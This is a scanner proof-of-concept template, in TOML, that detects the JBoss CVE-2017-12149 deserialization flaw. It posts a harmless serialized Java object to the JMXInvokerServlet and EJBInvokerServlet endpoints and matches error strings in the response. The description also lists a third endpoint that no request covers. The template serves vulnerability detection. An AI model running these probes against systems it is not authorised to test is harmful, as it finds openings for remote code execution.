[info]
author = "ave"
description = "检测目标 JBoss 服务器是否存在 CVE-2017-12149 反序列化漏洞。通过向 /invoker/JMXInvokerServlet、/invoker/EJBInvokerServlet 和 /invoker/readonly 三个端点发送特制的 Java 序列化数据，若响应中包含 JBoss 和 ClassCastException 特征字符串，则判定存在漏洞。"
id = "POC-AVE-2017-0308"
name = "JBoss Application Server 反序列化远程代码执行漏洞 PoC"
severity = "critical"
tags = ["ave-2017-0308"]
vuln_id = [
    "CVE-2017-12149",
    "AVE-2017-0308",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/invoker/JMXInvokerServlet/"
protocol = "http"

[poc.requests.body]
content = '{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/octet-stream"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "JBoss",
    "ClassCastException",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/invoker/EJBInvokerServlet/"
protocol = "http"

[poc.requests.body]
content = '{{ base64_decode("rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAAJZWxlbWVudCAxdAAJZWxlbWVudCAyeA==") }}'
type = "raw"

[poc.requests.headers]
Content-Type = "application/octet-stream"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "JBoss",
    "ClassCastException",
]

